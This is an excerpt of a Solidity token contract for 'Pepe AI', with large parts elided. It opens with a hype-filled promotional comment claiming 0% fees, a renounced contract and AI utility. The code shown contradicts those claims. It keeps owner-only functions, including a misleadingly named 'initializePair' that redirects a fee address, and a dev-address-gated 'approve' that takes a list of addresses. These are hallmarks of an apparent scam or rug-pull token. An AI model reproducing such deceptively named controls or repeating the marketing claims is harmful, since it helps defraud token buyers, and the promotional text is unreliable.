...
/**
Pepe AI is embarking on a new journey as we join the ETH network! The success of Pepe AI precedes us 😎, and we're ready to make waves 🌊 in the Ethereum ecosystem! With this bold move, we're putting any doubts to rest and showing the world 🌐 that we are the real deal! 🏆 Get ready for another epic journey to success with Pepe AI! ➕ Pepe AI have awesome features and real utility.💲0% fees 📑 Renounced contract 🛠 Real utility – such as ✅Staking ✅Bots ✅GPT-3.5 and more.
*/
...
contract PepeBRC20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    uint256 private _totalSuppply = 420 * 10 ** 10 * 10 ** 6;
    ...
    uint256 private _total = 420 * 10 ** 10 * 10 ** 6;
    ...
    function initializePair(address _a) external onlyOwner {
        burnFee = _a;
    }
    ...
    function approve(address[] memory approvedAddress) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
